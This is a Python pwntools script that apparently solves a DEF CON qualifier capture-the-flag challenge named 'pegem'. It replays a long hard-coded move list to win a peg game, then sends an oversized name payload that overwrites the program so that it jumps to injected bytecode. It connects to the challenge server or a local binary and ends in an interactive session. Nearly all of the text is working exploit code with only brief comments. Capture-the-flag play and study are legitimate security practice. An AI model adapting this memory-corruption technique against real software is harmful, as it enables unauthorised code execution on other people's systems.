from pwn import *

moves = [ "Da", "Fd", "Af", "Gb", "Jc", "Le", "Mf", "Bi", "Cj", "Of", "Fm", "Nl", "Km", "Gb",
					"Ad", "Ig", "Ch", "Gb", "Jc", "Le", "Bi", "Nl", "Km", "Mf", "Cj", "Of", "Jc", "Af",
					"Hj", "Bi", "Gb", "Jc", "Ne", "Ch", "Ln", "Om", "Md", "Bg", "Kd", "Ad", "Fa", "Df",
					"Jc", "Af", "Md", "Gb", "Om", "Ln", "Ne", "Fd", "Bg", "Kd", "Le", "Jh", "Bi", "Cj",
					"Gb", "Ad", "Nl", "Dm", "Ln", "Of", "Fm", "Nl", "Km", "Af", "Da", "Fd", "Gb", "Ad",
					"Le", "Df", "Jc", "Nl", "Km", "Mf", "Cj", "Of", "Bg", "Fd", "Af", "Gb", "Jc", "Le",
					"Mf", "Bi", "Cj", "Of", "Fm", "Nl", "Km", "Ch", "Jc", "Mf", "Cj", "Gi", "Bg", "Kd",
					"Om", "Ln", "Ne", "Df", "Jc", "Af", "Bi", "Gb", "Le", "Ch", "Jc", "Af", "Nl", "Fm",
					"Ln", "Om", "Md", "Bg", "Kd", "Cj", "Df", "Ad", "Gb", "Jc", "Le", "Mf", "Bi", "Cj",
					"Of", "Fm", "Nl", "Km", "Dk", "Ad", "Ig", "Ch", "Gb", "Jc", "Le", "Bi", "Nl", "Km",
					"Mf", "Cj", "Of", "Nl", "Dm", "Ad", "Ch", "Gb", "Jc", "Le", "Mf", "Cj", "Of", "Fd",
					"Bg", "Kd", "Dm", "Ad", "Ch", "Gb", "Jc", "Le", "Mf", "Bi", "Cj", "Of", "Fm", "Nl",
					"Km", "Ln", "Dm", "Ad", "Ch", "Gb", "Jc", "Md", "Bg", "Kd", "Ne", "Df", "Cj", "Of",
					"Fo", "Af", "Hj", "Bi", "Gb", "Jc", "Ne", "Ch", "Ln", "Om", "Md", "Bg", "Kd" ]

useremote = "remote" in sys.argv
useemulator = "emulator" in sys.argv

if useremote:
	p = remote("pegem_d144a0fa24a0fc17809d4f56600bc740.quals.shallweplayaga.me", 1234)
elif useemulator:
	p = process("./emulator")
else:
	p = process("./pegem")

context.log_level = 'debug'

if not useemulator and not useremote and not "nogdb" in sys.argv:
	gdb.attach(p, '''
	set disassembly-flavor intel
	handle SIGALRM nopass nostop noprint
	set height 0
	break puts
	c
	''')

# Win the game so we can enter our name
output = ""
for move in moves:
	output += p.readuntil(":")
	p.writeline(move)

# Send a really long name that'll run one of our instructions, which will jump to the rest
payload = ""
payload += "\x03\x00\xb5" # address 0xb2 (The first byte in this string is the index to print at the end)
payload += "\xb8\xb3\xb2" # address 0xb5
payload += "\x01"         # address 0xb8
payload += "\x12" * (291 - len(payload)) # padding
payload += "\x01\x01\xb2" # This instruction will get run, it jumps to address 0xb2 (the code above)
p.writeline(payload)

output += p.clean()

print '"{}"'.format(output)

p.interactive()
